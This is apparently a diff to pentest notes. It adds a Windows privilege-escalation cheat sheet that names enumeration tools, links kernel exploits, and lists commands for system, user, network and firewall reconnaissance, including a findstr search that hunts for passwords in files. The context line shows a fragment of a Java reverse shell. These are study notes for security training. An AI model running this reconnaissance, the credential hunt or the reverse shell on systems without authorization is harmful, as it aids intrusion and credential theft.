@@ -1457,6 +1457,47 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 </aside>
 
+## Windows Privilege Escalation -TCM Security
+- Executable winPEAS.exe, compile Seatbelt.exe, Watson.exe, SharpUp.exe
+- Powershell Sherlock.ps1, PowerUp.ps1, Jaws-enum.ps1
+- Other Windows-Exploit-Suggester.py, Exploit Suggester(Metasploit)
+- Windows  kernel [Exploits](https://github.com/SecWiki/windows-kernel-exploits), 
+```powershell
+# System information based on system version and bit we can find/create a kernel exploit
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+wmic qfe # Patch update some systems don't work
+wmic logicaldisk get caption,description,providername #logical disk information
+
+# Users and groups
+whoami /priv #User privileges
+whoami /groups # Show you groups
+net user
+net user <users>
+net localgroup
+net localgroup administrators
+
+# Network administrator
+ipconfig
+ipconfig /all
+arp -a
+route print
+
+# Ports
+netstat -ano
+
+# Password hunting
+findstr /si password *.txt, *.ini, *.config
+
+# Firewall and Antivirus Enumeration
+sc query windefend
+sc queryex type= service
+netsh advfilewall firewall dump
+netsh firewall show state
+netsh firewall show config
+
+```
+
 ## Manual Enumeration commands
 
 ```bash
